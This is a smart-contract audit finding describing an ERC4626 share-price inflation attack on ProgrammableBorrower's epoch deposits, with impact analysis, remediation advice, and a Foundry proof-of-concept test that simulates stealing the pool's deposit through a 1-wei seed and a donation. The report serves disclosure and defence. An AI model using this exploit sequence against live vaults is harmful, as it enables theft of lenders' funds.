### Title
ERC4626 share-price inflation steals programmable-borrower epoch deposits - (File: `contracts/strategies/idle/ProgrammableBorrower.sol`)

### Summary
`ProgrammableBorrower._depositToVault` calls `vault.deposit` but ignores the number of ERC4626 shares returned, so a public vault depositor can inflate the vault’s share price before `startEpoch` and make the pool’s deposit mint zero or near-zero shares. [1](#0-0) 

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` sends pooled underlyings to the borrower adapter and then invokes `onStartEpoch`. [2](#0-1)  `onStartEpoch` snapshots the pre-deposit balance as `epochStartVaultAssets`, then deposits all on-hand underlyings into the configured ERC4626 vault. [3](#0-2)  Because the returned share count is never checked, an attacker can first deposit `1` wei into an empty or near-empty ERC4626 vault and donate `D >= P`, where `P` is the pool deposit. [1](#0-0)  Under ordinary floor-rounded `assets * totalSupply / totalAssets` conversion, the pool deposit mints zero shares while the attacker retains the only share and can redeem the donated amount plus the pool deposit.

The accounting baseline still records `P` as epoch principal even though the adapter received no vault shares. [4](#0-3)  In minted-interest mode, `stopEpoch` pulls no cash for interest and only mints the resolved gross interest; when the reported interest is zero because the entire vault position is a loss, the stop can complete without burning the missing principal. [5](#0-4) [6](#0-5)  The CDO’s NAV remains represented by strategy tokens minted when lender underlyings entered the strategy, even though those underlyings were subsequently extracted through the ERC4626 inflation. [7](#0-6) 

### Impact Explanation
The attacker steals up to the entire programmable-borrower deposit sent into the inflated ERC4626 vault during `startEpoch`. The pool keeps accounting as though strategy tokens still represent the deposited principal, leaving lender claims insolvent until a close or withdrawal attempt exposes the missing funds. [8](#0-7)  On a later close, `onStopEpoch` can report success because the required shortfall exceeds the adapter’s vault assets, after which the CDO’s `transferFrom` fails and the pool enters the borrower-default path. [9](#0-8) [10](#0-9) 

For a concrete `P = 10_000e6` USDC deposit, the attacker deposits `1` wei, donates `10_000e6`, lets the pool deposit mint zero shares, and redeems the sole share for approximately `20_000e6 + 1`, for a net gain of approximately `10_000e6`.

### Likelihood Explanation
The attacker only needs to be an ordinary user of the configured ERC4626 vault and does not need any privileged role in `ProgrammableBorrower`, `IdleCreditVault`, or the CDO. The exploit requires the selected ERC4626 to use raw-balance accounting, have sufficiently low share supply, and permit a deposit that mints zero or economically negligible shares. Those conditions are most plausible at initial deployment of the programmable-borrower facility or after switching to a newly deployed or low-liquidity vault through `setVault`. [11](#0-10) 

### Recommendation
Reject ERC4626 deposits that mint zero shares or fewer shares than an independently calculated minimum. Prefer `vault.mint(expectedShares, address(this))` with a bounded asset allowance, or require `shares >= vault.previewDeposit(_assetAmount)` with slippage limited to explicitly tolerated fees. The pool should also require the configured vault to use inflation-resistant accounting, such as virtual shares/assets or a non-zero initial liquidity seed, and should treat a deposit returning `convertToAssets(shares) < _assetAmount` beyond rounding as a failed epoch start.

### Proof of Concept
This Foundry-style sequence assumes the programmable-borrower fixture from `ProgrammableBorrowerCreditVault.t.sol`, a programmable borrower configured as `borrower`, minted-interest accounting enabled, and a target ERC4626 vault that uses raw assets and currently has zero supply:

```solidity
function testProgrammableBorrowerVaultShareInflation() external {
    uint256 poolDeposit = 10_000e6;
    uint256 attackerSeed = 1;
    uint256 inflationDonation = poolDeposit;

    // A lender deposits during the buffer; IdleCreditVault mints matching
    // strategy tokens to the CDO.
    idleCDO.depositAA(poolDeposit);
    assertEq(strategy.balanceOf(address(idleCDO)), poolDeposit);

    // Attacker is only a public user of the configured ERC4626 vault.
    deal(USDC, attacker, attackerSeed + inflationDonation);
    vm.startPrank(attacker);
    underlying.approve(address(programmableBorrower.vault()), attackerSeed);
    IERC4626(programmableBorrower.vault()).deposit(attackerSeed, attacker);

    // Inflate price to poolDeposit + 1 assets per 1 share.
    underlying.transfer(programmableBorrower.vault(), inflationDonation);
    vm.stopPrank();

    // Honest manager starts the epoch. The CDO sends poolDeposit to the
    // programmable borrower, whose onStartEpoch deposits it into the vault.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    // With D >= P and only one outstanding share, P mints zero shares.
    assertEq(IERC4626(programmableBorrower.vault()).balanceOf(address(programmableBorrower)), 0);
    assertEq(programmableBorrower.totalUnderlying(), 0);

    // Attacker redeems the sole share for donation + seed + pool deposit.
    vm.prank(attacker);
    uint256 stolen = IERC4626(programmableBorrower.vault()).redeem(
        attackerSeed,
        attacker,
        attacker
    );
    assertEq(stolen, attackerSeed + inflationDonation + poolDeposit);

    // Minted-interest stop can succeed with zero reported interest while CDO
    // strategy-token NAV still claims poolDeposit of backing.
    vm.warp(cdoEpoch.epochEndDate() + 1);
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 0);
    assertEq(cdoEpoch.getContractValue(), poolDeposit);

    // Closing the pool exposes the theft: the adapter cannot return principal.
    vm.prank(manager);
    cdoEpoch.stopEpoch(0, 1);
    assertTrue(cdoEpoch.defaulted());
}
```
